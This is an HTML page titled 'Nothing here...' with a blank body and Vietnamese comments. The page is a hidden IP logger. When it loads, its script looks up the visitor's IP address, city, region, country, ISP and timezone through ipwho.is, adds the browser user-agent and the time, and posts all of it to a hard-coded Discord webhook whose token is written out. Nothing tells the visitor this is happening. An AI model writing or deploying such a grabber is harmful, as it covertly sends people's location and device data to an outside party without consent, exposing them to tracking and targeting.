<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Nothing here...</title>
  <script>
    // Lấy thông tin IP & vị trí
    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip || "Không rõ";
        const city = data.city || "Không rõ";
        const region = data.region || "Không rõ";
        const country = data.country || "Không rõ";
        const isp = data.connection?.isp || "Không rõ";
        const timezone = data.timezone?.id || "Không rõ";

        // Lấy user-agent (thiết bị)
        const userAgent = navigator.userAgent;

        // Thời gian hiện tại
        const now = new Date();
        const time = now.toLocaleTimeString();
        const date = now.toLocaleDateString();

        // Webhook Discord của anh (đổi nếu cần)
        const webhookUrl = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";

        // Nội dung gửi về Discord
        const message = {
          content: `📍 **Ai đó vừa vào web!**

🌐 **IP**: ${ip}
📍 **Vị trí**: ${city}, ${region}, ${country}
📶 **Nhà mạng**: ${isp}
🕒 **Múi giờ**: ${timezone}

💻 **Thiết bị**: ${userAgent}
🕓 **Thời gian**: ${time} ${date}`
        };

        // Gửi về webhook
        fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(message)
        });
      })
      .catch(err => console.error("Lỗi khi lấy IP hoặc gửi webhook:", err));
  </script>
</head>
<body style="background-color: white; margin: 0; padding: 0;">
</body>
</html>
